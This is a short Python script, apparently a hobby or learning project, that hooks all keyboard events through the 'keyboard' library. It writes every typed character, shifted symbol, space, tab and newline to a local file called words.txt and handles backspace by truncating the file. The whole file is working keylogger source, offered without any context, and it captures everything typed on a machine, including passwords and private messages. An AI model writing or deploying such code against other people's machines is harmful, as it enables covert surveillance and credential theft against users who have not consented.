import keyboard
import os

def get_shift_symbol(n: int) -> str:
    shift_symbols = {
        1: "!",
        2: "@",
        3: "#",
        4: "$",
        5: "%",
        6: "^",
        7: "&",
        8: "*",
        9: "(",
        0: ")"
    }
    return shift_symbols.get(n, str(n))

is_shift = False
skip_next_digit = False
IGNORED_KEYS = {"shift", "right shift", "left shift", "ctrl", "right ctrl", "left ctrl", "alt", "right alt", "left alt"}

def press_event(event: keyboard.KeyboardEvent) -> None:
    global is_shift, skip_next_digit
    print(f"The key is - {event.name}")

    if event.name == "shift":
        is_shift = True
    elif event.name == "backspace":
        pass

    elif is_shift and  event.name is not None and event.name.isdigit():
        with open("words.txt", "a") as file:
            file.write(get_shift_symbol(int(event.name)))
        is_shift = False
        skip_next_digit = True

def release_event(event: keyboard.KeyboardEvent) -> None:
    global is_shift, skip_next_digit
    print(f"The key is - {event.name}")

    if event.name in IGNORED_KEYS:
        return
    elif event.name == "backspace":
        try:
            with open("words.txt", "rb+") as file:
                file.seek(0, os.SEEK_END)
                pos = file.tell()
                if pos > 0:
                    file.truncate(pos - 1)
        except FileNotFoundError:
            pass
    elif event.name == "shift":
        is_shift = False
    elif event.name is not None and event.name.isdigit():
        if skip_next_digit:
            skip_next_digit = False
            return
        with open("words.txt", "a") as file:
            file.write(event.name)
    else:
        with open("words.txt", "a") as file:
            if event.name == "space":
                file.write(" ")
            elif event.name == "enter":
                file.write("\n")
            elif event.name == "tab":
                file.write("\t")
            else:
                file.write(f"{event.name}")

keyboard.on_release(callback=release_event)
keyboard.on_press(callback=press_event)
keyboard.wait()